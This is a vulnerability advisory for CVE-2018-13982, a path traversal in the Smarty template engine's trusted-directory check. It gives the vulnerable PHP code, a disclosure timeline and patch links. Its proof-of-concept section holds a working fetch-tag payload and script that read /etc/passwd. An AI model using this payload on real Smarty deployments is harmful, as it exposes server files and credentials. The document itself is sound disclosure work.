# Smarty Trusted-Directory Bypass via Path Traversal #

## Vulnerability Overview ##

Smarty 3.1.32 or below is prone to a path traversal vulnerability due
to insufficient sanitization of code in Smarty templates. This allows
attackers controlling the Smarty template to bypass the trusted
directory security restriction and read arbitrary files.

* **Identifier**            : SBA-ADV-20180420-01
* **Type of Vulnerability** : Path Traversal
* **Software/Product Name** : [Smarty](https://www.smarty.net/)
* **Vendor**                : Smarty
* **Affected Versions**     : 3.1.32 and probably prior
* **Fixed in Version**      : 3.1.33
* **CVE ID**                : CVE-2018-13982
* **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
* **CVSSv3 Base Score**     : 8.6 (High)

## Vendor Description ##

> Smarty is a template engine for PHP, facilitating the separation of
> presentation (HTML/CSS) from application logic. This implies that PHP
> code is application logic, and is separated from the presentation.

Source: <https://www.smarty.net/about_smarty>

## Impact ##

An attacker controlling the executed template code can read arbitrary
files accessible by the webserver by exploiting the vulnerability
documented in this advisory. Sensitive data such as database credentials
might get exposed through this attack.

We recommend upgrading to version 3.1.33 or newer.

## Vulnerability Description ##

Smarty allows restricting which paths are accessible paths during
template evaluation. This feature is implemented in the
`Smarty_Security` class and is enabled via the method `enableSecurity`.
However, the trusted directory check implemented in the method
`isTrustedResourceDir` of the `Smarty_Security` class is vulnerable to
path traversal.

The method `isTrustedResourceDir` first builds a list of allowed
directories in `$filepath` and then relies on the `_checkDir` method
to check if the requested resource dir is trusted. In version 0.3.31
neither `isTrustedResourceDir` nor `_checkDir` avoid path traversal:

```php
public function isTrustedResourceDir($filepath, $isConfig = null)
{
    [...]
    $this->_resource_dir = $this->_checkDir($filepath, $this->_resource_dir);
    return true;
}

private function _checkDir($filepath, $dirs)
{
    $directory = dirname($filepath) . DIRECTORY_SEPARATOR;
    $_directory = array();
    while (true) {
        // remember the directory to add it to _resource_dir in case we're successful
        $_directory[ $directory ] = true;
        // test if the directory is trusted
        if (isset($dirs[ $directory ])) {
            // merge sub directories of current $directory into _resource_dir to speed up subsequent lookup
            $dirs = array_merge($dirs, $_directory);
            return $dirs;
        }
        // abort if we've reached root
        if (!preg_match('#[\\\/][^\\\/]+[\\\/]$#', $directory)) {
            break;
        }
        // bubble up one level
        $directory = preg_replace('#[\\\/][^\\\/]+[\\\/]$#', DIRECTORY_SEPARATOR, $directory);
    }
    // give up
    throw new SmartyException("directory '{$filepath}' not allowed by security setting");
}
```

In version 0.3.32 `_checkDir` calls `_realpath` before checking if the
requested resource is trusted. However, the custom realpath method is
broken and allows path traversal at least on Unix systems.

For example, the fetch tag uses the `isTrustedResourceDir` method to
check if a user-specified path is allowed to read.

## Proof-of-Concept ##

An attacker can exploit this vulnerability by using the fetch tag:

```php
{fetch file="/var/www/templates/../../../../../etc/passwd"}
```

Full example:

```php
<?php
require_once "vendor/autoload.php";

$smarty = new Smarty;
$smarty->enableSecurity();
// Fails
//$smarty->display('eval:{fetch file="/etc/passwd"}');
// Works
$smarty->display('eval:{fetch file="'.addslashes(getcwd()).'/templates/../../../../../etc/passwd"}');
```

## Timeline ##

* `2018-04-20`: identification of vulnerability in version 3.1.31
* `2018-04-23`: initial vendor contact
* `2018-04-23`: disclosed vulnerability to vendor
* `2018-04-24`: vendor acknowledged vulnerability and released version 3.1.32
* `2018-04-25`: notified vendor about incomplete fix
* `2018-04-26`: vendor fixed vulnerability
* `2018-07-10`: request CVE from MITRE
* `2018-07-11`: MITRE assigned CVE-2018-13982
* `2018-09-12`: vendor released fix in version 3.1.33
* `2018-09-17`: public disclosure

## References ##

* Changelog: <https://github.com/smarty-php/smarty/commit/bcedfd6b58bed4a7366336979ebaa5a240581531>
* Patches:
  * <https://github.com/smarty-php/smarty/commit/8d21f38dc35c4cd6b31c2f23fc9b8e5adbc56dfe>
  * <https://github.com/smarty-php/smarty/commit/f9ca3c63d1250bb56b2bda609dcc9dd81f0065f8>
  * <https://github.com/smarty-php/smarty/commit/2e081a51b1effddb23f87952959139ac62654d50>
  * <https://github.com/smarty-php/smarty/commit/c9dbe1d08c081912d02bd851d1d1b6388f6133d1>

## Credits ##

* David Gnedt ([SBA Research](https://www.sba-research.org/))
* Thomas Konrad ([SBA Research](https://www.sba-research.org/))
